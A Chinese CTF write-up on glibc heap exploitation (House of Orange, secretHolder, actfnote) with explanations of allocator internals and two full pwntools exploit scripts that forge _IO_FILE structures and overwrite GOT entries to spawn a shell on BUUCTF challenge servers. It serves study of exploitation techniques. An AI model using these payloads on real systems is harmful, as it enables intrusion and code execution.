<p>现在再来解释为什么要伪造size<br>刚才看到了，我们把main_arena上面写入了堆地址，是通过把unsorted bin放入small bin来实现的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843929808-b515f425-583b-4c4e-91ac-1572a1e99ef8.png#averageHue=%23201f1e&clientId=u9d5fd636-f51f-4&from=paste&height=573&id=u9cce6b7a&originHeight=716&originWidth=953&originalType=binary&ratio=1&rotation=0&showTitle=false&size=221818&status=done&style=none&taskId=ufaeb0002-f7cf-4181-8e3e-7c2293958c3&title=&width=762.4" alt="image.png"><br>可以看到我们写入的0x61的size刚好对应的是IO结构的_chain,也就是我们可以伪造下一个file结构<br>为什么不直接修改vtable呢，我们可以看这个堆地址，由于需要伪造的OVERfloww刚好是第4个函数，所以他处在的位置是我们不可以直接伪造的，所以只能通过上面这种利用方法来打<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843938636-4f51f9a8-136b-44e8-a9f4-c376200569cd.png#averageHue=%23302d2d&clientId=u9d5fd636-f51f-4&from=paste&height=65&id=u8689a0bb&originHeight=81&originWidth=938&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44803&status=done&style=none&taskId=u5faca049-8329-48ed-8b24-e5d63e54314&title=&width=750.4" alt="image.png"><br>下面再看<br>_IO_flush_all_lockp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># define _IO_flockfile(_fp) \</span><br><span class="line">  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0)				      \</span><br><span class="line">     _IO_lock_lock (*(_fp)-&gt;_lock)</span><br><span class="line">这个_IO_USER_LOCK为0x8000,如果if为真，那么我们就直接会完蛋，因为下面这个函数执行会出错</span><br></pre></td></tr></table></figure>
<p>而main_arena里面对应的mode&gt;0,所以第二个if也跳过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># define_IO_funlockfile(_fp) \</span><br><span class="line">  if (((_fp)-&gt;_flags &amp;_IO_USER_LOCK) == 0)				      \</span><br><span class="line">_IO_lock_unlock (*(_fp)-&gt;_lock)</span><br></pre></td></tr></table></figure>
<p>感觉这个exp不稳定就是_IO_flockfile引起的，所以有时候会挂掉，额不管了就是还是直接打就好<br>第二次就进入了我们伪造的file结构，要保证<br>mode≤0,write_ptr&gt;write_base<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843974593-7313fbd4-6fd8-4cfa-86ce-6693006241ed.png#averageHue=%23171717&clientId=u9d5fd636-f51f-4&from=paste&height=576&id=uc5262c41&originHeight=720&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=123222&status=done&style=none&taskId=uc74ba3b9-aa79-4eef-97e4-67912f0919e&title=&width=772.8" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = &quot;./houseoforange_hitcon_2016&quot;</span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=&quot;debug&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">if &quot;2.23&quot; in libc.path:</span><br><span class="line">    one_gadget = [0x4526A, 0x45216, 0xF02A4, 0xF1147]</span><br><span class="line">elif &quot;2.27&quot; in libc.path:</span><br><span class="line">    one_gadget = [0x4F2C5, 0x4F322, 0x10A38C]</span><br><span class="line">else:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">    remote_ip = &quot;node4.buuoj.cn&quot;</span><br><span class="line">    remote_port =27842</span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line">else:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = &quot;&quot;&quot;</span><br><span class="line">    b *$rebase(0xD68)</span><br><span class="line">    b *$rebase(0xDA5)</span><br><span class="line">    c</span><br><span class="line">    x/xg $rebase(0x203070)</span><br><span class="line">    x/3xg $rebase(0x203068)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&lt;=010000</span><br><span class="line">def add(size,content,price,color):</span><br><span class="line">    sla(b&quot;Your choice : &quot;, b&quot;1&quot;)</span><br><span class="line">    sla(b&quot;Length of name &quot;,str(size))</span><br><span class="line">    sa(b&quot;Name :&quot;,content)</span><br><span class="line">    sla(b&quot;Price of Orange:&quot;,str(price))</span><br><span class="line">    sla(b&quot;Color of Orange:&quot;,str(color))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b&quot;Your choice : &quot;, b&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def edit(size,content,price,color):</span><br><span class="line">    sla(b&quot;Your choice : &quot;, b&quot;3&quot;)</span><br><span class="line">    sla(b&quot;Length of name &quot;,str(size))</span><br><span class="line">    sa(b&quot;Name:&quot;,content)</span><br><span class="line">    sla(b&quot;Price of Orange:&quot;,str(price))</span><br><span class="line">    sla(b&quot;Color of Orange:&quot;,str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x18,b&quot;a&quot;,1,56746)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">add(0x1000,b&quot;a&quot;,1,2)</span><br><span class="line">add(0x3f8,b&quot;a&quot;,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : &quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))-0x7feee024d161+0x7feedfe88000</span><br><span class="line">edit(0x10,b&quot;a&quot;*0x10,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_addr=u64(rld().ljust(8,b&quot;\0&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(0)*0x7f+p64(0x21)+p64(0)*2+b&quot;/bin/sh\0&quot;+p64(0x61)+p64(0)+p64(libc_base+libc.sym[&quot;_IO_list_all&quot;]-0x10)#unsorted bin attack+fake size</span><br><span class="line">fake_IO_structure=p64(0)+p64(1)+p64(0)*0x15+p64(heap_addr+0x500)</span><br><span class="line">payload+=fake_IO_structure</span><br><span class="line">fake_vtable=p64(0)*3+p64(libc_base+libc.sym[&quot;system&quot;])</span><br><span class="line">payload+=fake_vtable</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">sla(b&quot;Your choice : &quot;, b&quot;1&quot;)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h2 id="把mmap出来的块用top-chunk分配"><a href="#把mmap出来的块用top-chunk分配" class="headerlink" title="把mmap出来的块用top chunk分配"></a>把mmap出来的块用top chunk分配</h2><h3 id="secretHolder-hitcon-2016"><a href="#secretHolder-hitcon-2016" class="headerlink" title="secretHolder_hitcon_2016"></a>secretHolder_hitcon_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#secretHolder_hitcon_2016">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./secretHolder_hitcon_2016&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28722</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x400AF8</span></span><br><span class="line"><span class="string">    b *0x4009D2</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/4xg 0x06020A0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;3. Renew secret\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;3. Huge secret\n&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;secret: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;3. Renew secret\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;3. Huge secret\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;3. Renew secret\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;3. Huge secret\n&quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;secret: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">ptr = <span class="number">0x6020A8</span></span><br><span class="line">payload = (</span><br><span class="line">    p64(<span class="number">0</span>)</span><br><span class="line">    + p64(<span class="number">0x21</span>)</span><br><span class="line">    + p64(ptr - <span class="number">0x18</span>)</span><br><span class="line">    + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">    + p64(<span class="number">0x20</span>)</span><br><span class="line">    + p64(<span class="number">0x90</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">17</span></span><br><span class="line">    + p64(<span class="number">0x21</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">    + p8(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line">add(<span class="number">3</span>, payload)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(ptr - <span class="number">8</span>) + p64(elf.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    p64(libc_base + next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>))) + p64(ptr) + p64(elf.got[<span class="string">&quot;free&quot;</span>]),</span><br><span class="line">)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>这个题目的删除函数只会把flag位清空，但可以一直free</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844035946-cee90c8d-ee40-4806-890a-088cd47f6ca9.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=582&id=uf25e85c2&originHeight=728&originWidth=952&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117949&status=done&style=none&taskId=u71bc214a-829a-40ba-b5dc-b73cf721ee6&title=&width=761.6" alt="image.png"></p>
<p>edit会在flag为1编辑</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844044447-04a97f7d-7ccc-402c-9616-307892749ac5.png#averageHue=%23fefefe&clientId=u9d5fd636-f51f-4&from=paste&height=618&id=uddbc0213&originHeight=772&originWidth=909&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128411&status=done&style=none&taskId=u24c6c826-eab4-415b-ae7d-0034510fd26&title=&width=727.2" alt="image.png"></p>
<p>首先分析free函数</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844055437-1d843c60-9da4-4de2-9c4e-7c675576125b.png#averageHue=%23595958&clientId=u9d5fd636-f51f-4&from=paste&height=146&id=ud56047bd&originHeight=183&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46512&status=done&style=none&taskId=u7991da39-c384-4d0e-883e-45faec2e471&title=&width=820" alt="image.png"></p>
<p>no_dyn_threshold为0，表示我们开启了动态threshold大小，这就是导致漏洞的根源，利用动态调整大小来扩大top chunk可以分配的范围</p>
<p>mp_.mmap_threshold初始大小为0x20000,DEAFUALT大小为0x2000000，这里我们刚好满足</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844068210-70185005-9583-47e7-9deb-160eb5b352d1.png#averageHue=%23a1a09e&clientId=u9d5fd636-f51f-4&from=paste&height=338&id=uc7358022&originHeight=422&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124038&status=done&style=none&taskId=u4ecff212-f076-4ceb-bcfa-067e272d2ee&title=&width=776" alt="image.png"></p>
<p>所以我们这里调整了threshold的值，这里因为用mmap分配的时候有页对齐，0x61A80对齐到了0x62000</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844077479-855d852e-c256-4ba0-a7a1-6b0c180bf1d3.png#averageHue=%23313030&clientId=u9d5fd636-f51f-4&from=paste&height=498&id=u6d297e95&originHeight=623&originWidth=897&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120356&status=done&style=none&taskId=u075cde57-7dbd-418c-a465-21ef9283973&title=&width=717.6" alt="image.png"></p>
<p>这里free之后我们比较一下两次sysmalloc的区别</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844093566-41c3630c-f74d-45b6-a6d7-412a0169f242.png#averageHue=%23414140&clientId=u9d5fd636-f51f-4&from=paste&height=670&id=ueadd3721&originHeight=837&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156434&status=done&style=none&taskId=ub101d1d1-ebd4-4210-8870-0028852bc46&title=&width=774.4" alt="image.png"></p>
<p>第一次由于是初始状态所以走mmap分配</p>
<p>第二次由于我们修改之后所以if不满足</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844104881-7285eaa3-a533-41b7-a01a-932a38ab2702.png#averageHue=%23404040&clientId=u9d5fd636-f51f-4&from=paste&height=414&id=u2bb45730&originHeight=517&originWidth=787&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82570&status=done&style=none&taskId=u676f0bba-0a07-4df9-a129-d7972a4a32c&title=&width=629.6" alt="image.png"></p>
<p>开始走topochunk分配</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844118759-dd69d851-af4a-45be-bebc-6a42e55dc4f6.png#averageHue=%23444342&clientId=u9d5fd636-f51f-4&from=paste&height=173&id=u26747463&originHeight=216&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53345&status=done&style=none&taskId=ub4eacb24-43ec-4d2f-bb50-21a3d153d4b&title=&width=728.8" alt="image.png"></p>
<p>计算需要的size nb就是malloc的size+0x10,mp_.top_pad就是0x20000</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844132468-3b4f7159-e9df-4e50-b41f-236088d1ee8e.png#averageHue=%238b8b8a&clientId=u9d5fd636-f51f-4&from=paste&height=181&id=ub1ff66eb&originHeight=226&originWidth=904&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47716&status=done&style=none&taskId=uf57680cf-bb50-4cf2-b4b5-97520e2bc46&title=&width=723.2" alt="image.png"></p>
<p>同时当分配largebin的时候，如果有free的fastbin，会把fastbin合并</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844142994-7f93d663-c33d-4c7a-b2d1-9d3014685b6e.png#averageHue=%23fcf9f7&clientId=u9d5fd636-f51f-4&from=paste&height=147&id=udbc2d25c&originHeight=184&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26960&status=done&style=none&taskId=u482f7c05-df42-485c-b04e-493a82f04ae&title=&width=712" alt="image.png"></p>
<p>malloc_consolidate首先把main_arena的flag清空，表示没有free的fastbin</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844149582-fc0a3072-7556-47d4-a609-0f7eec1635e9.png#averageHue=%23fafaf9&clientId=u9d5fd636-f51f-4&from=paste&height=202&id=u8422bbd1&originHeight=253&originWidth=905&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41175&status=done&style=none&taskId=uab7813e9-3f68-43d1-a075-435a943d0f6&title=&width=724" alt="image.png"></p>
<p>大循环就是fb从fastbiny[0]的地址一直到fastbiny[10]的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p =atomic_exchange_acq (fb, <span class="number">0</span>);，把fastbin里面的值改成<span class="number">0</span>,头结点的值取出来</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;<span class="comment">//内循环就是处理每个同样size的fastbin空闲链表</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">	  nextchunk =chunk_at_offset(p, size);</span><br><span class="line">	  nextsize =chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	    prevsize = p-&gt;prev_size;</span><br><span class="line">	    size += prevsize;</span><br><span class="line">	    p =chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">unlink(av, p, bck, fwd);<span class="comment">//fastbin也可以触发unlink</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (nextchunk !=av-&gt;top) &#123;</span><br><span class="line">	    nextinuse =inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	      size += nextsize;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);<span class="comment">//合并的时候就算是fastbin也会尝试向前向后合并</span></span><br><span class="line">	    &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	    unsorted_bin-&gt;fd = p;</span><br><span class="line">	    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">	      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">set_head(p, size |PREV_INUSE);</span><br><span class="line">	    p-&gt;bk = unsorted_bin;</span><br><span class="line">	    p-&gt;fd = first_unsorted;</span><br><span class="line">set_foot(p, size);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">else</span> &#123;</span><br><span class="line">	    size += nextsize;<span class="comment">//如果下一个是top chunk直接合并到top chunk</span></span><br><span class="line">set_head(p, size |PREV_INUSE);</span><br><span class="line">av-&gt;top = p;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> ( (p =nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//maxfb = &amp;fastbin (av, NFASTBINS - 1);  #define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure>

<h2 id="top-chunk上移"><a href="#top-chunk上移" class="headerlink" title="top chunk上移"></a>top chunk上移</h2><h3 id="actf-2019-actfnote"><a href="#actf-2019-actfnote" class="headerlink" title="actf_2019_actfnote"></a>actf_2019_actfnote</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_actfnote">BUUCTF在线评测</a></p>
<p>这个题目很不错里面有strdup来分配堆，由于strdup的原字符串保存在栈上，而栈上刚好也有可以泄露libc地址的东西，同时可以溢出修改top chunk的size然后分配一个负数，就会上移</p>
<p>malloc的size不能再-0x40~0这个范围内</p>
<p>不错的题目</p>
